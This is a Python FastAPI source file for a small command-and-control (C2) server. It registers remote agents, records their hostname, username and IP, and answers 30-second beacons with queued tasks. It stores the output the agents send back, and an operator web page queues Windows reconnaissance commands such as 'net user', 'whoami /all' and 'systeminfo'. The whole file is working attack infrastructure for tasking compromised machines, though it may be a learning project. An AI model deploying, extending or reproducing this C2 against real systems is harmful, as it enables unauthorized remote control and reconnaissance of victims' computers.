from fastapi import FastAPI, HTTPException, Request, Form
from pydantic import BaseModel
import uvicorn
from starlette.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates

import time, uuid
from datetime import datetime

from starlette.staticfiles import StaticFiles

app = FastAPI(title="C2 Server")

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

agentsList = {}
tasksList = {}
resultsList = {}

COMMANDS_LIST = {
    "dir": "dir",
    "net_user": "net user",
    "whoami": "whoami /all",
    "ip_config": "ipconfig /all",
    "system_info": "systeminfo",
    "tasklist": "tasklist",
    "exit": "exit"
}

class AgentDetails(BaseModel):
    id: str
    hostname: str
    username: str
    os_info: str
    ip_addr: str
    last_seen: float

class TaskDetails(BaseModel):
    id: str
    agent_id: str
    command: str
    timestamp: float
    status: str = "pending"

class TaskResult(BaseModel):
    task_id: str
    agent_id: str
    output: str
    timestamp: float


def get_agent_status(agent):
    return "active" if (time.time() - agent.last_seen) < 120 else "inactive"

def get_readable_time(timestamp):
    return datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")


@app.get("/", response_class=HTMLResponse)
async def homepage(request: Request):
    """Homepage of the C2 server"""
    agents = []
    for agent_id, agent in agentsList.items():
        agent_data = agent.dict()
        agent_data["status"] = get_agent_status(agent)
        agent_data["readable_last_seen"] = get_readable_time(agent.last_seen)
        agents.append(agent_data)

    return templates.TemplateResponse("index.html", {"request": request, "agents": agents})


@app.get("/agents/{agent_id}", response_class=HTMLResponse)
async def agent_details(request: Request, agent_id: str):
    """Details of a specific agent."""
    if agent_id not in agentsList:
        return RedirectResponse(url="/", status_code=404)

    agent_data = agentsList[agent_id].dict()
    agent_data["status"] = get_agent_status(agentsList[agent_id])
    agent_data["readable_last_seen"] = get_readable_time(agentsList[agent_id].last_seen)

    # Get all the tasks for the agent
    agent_tasks = []

    for task in tasksList[agent_id]:
        task_data = task.dict()
        task_data["readable_timestamp"] = get_readable_time(task.timestamp)

        if task.id in resultsList:
            result = resultsList[task.id]
            task_data["output"] = result.output
        else:
            task_data["output"] = "No results yet"

        agent_tasks.append(task_data)

    agent_tasks.sort(key=lambda x: x["timestamp"], reverse=True)

    return templates.TemplateResponse("agent.html", {"request": request, "agent": agent_data, "tasks": agent_tasks, "commands_list": COMMANDS_LIST})


@app.post("/agentSetup")
async def agent_setup(request: Request):
    """Agent registers with the C2 server by sending a POST request here."""
    agent_id = str(uuid.uuid4())
    info = await request.json()

    agentsList[agent_id] = AgentDetails(
        id=agent_id,
        hostname=info["hostname"],
        username=info["username"],
        os_info=info["os_info"],
        ip_addr=request.client.host,
        last_seen=time.time()
    )

    tasksList[agent_id] = []

    return {"agent_id": agent_id}


@app.post("/beacon/{agent_id}")
async def beacon(agent_id: str):
    """Agent sends a beacon POST request every 30 seconds here to update last seen and receive new commands."""
    if agent_id not in agentsList:
        raise HTTPException(status_code=404, detail="Agent not found")

    agentsList[agent_id].last_seen = time.time()

    pending_tasks = [task for task in tasksList[agent_id] if task.status == "pending"]

    tasks_to_send = [{"task_id": task.id, "command": task.command} for task in pending_tasks]

    return {"tasksList": tasks_to_send}


@app.post("/tasks/result")
async def receive_results(result: TaskResult):
    """Agent sends results to the C2 server through this POST request."""
    if result.agent_id not in agentsList:
        raise HTTPException(status_code=404, detail="Agent not found")

    task_found = False
    for task in tasksList[result.agent_id]:
        if task.id == result.task_id:
            task.status = "completed"
            task_found = True
            break

    if not task_found:
        raise HTTPException(status_code=404, detail="Task not found")

    resultsList[result.task_id] = result

    return {"status": "success"}


@app.post("/send_command/{agent_id}")
async def send_command(agent_id: str, cmd: str = Form(...)):
    """Commands submitted from UI will be added to the task list here."""
    if agent_id not in agentsList:
        raise HTTPException(status_code=404, detail="Agent not found")

    if cmd not in COMMANDS_LIST:
        raise HTTPException(status_code=404, detail="Command not found")

    command = COMMANDS_LIST[cmd]

    task_id = str(uuid.uuid4())
    task = TaskDetails(
        id=task_id,
        agent_id=agent_id,
        command=command,
        timestamp=time.time()
    )

    tasksList[agent_id].append(task)

    # Redirect back to the agent page
    return RedirectResponse(url=f"/agents/{agent_id}", status_code=303)


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
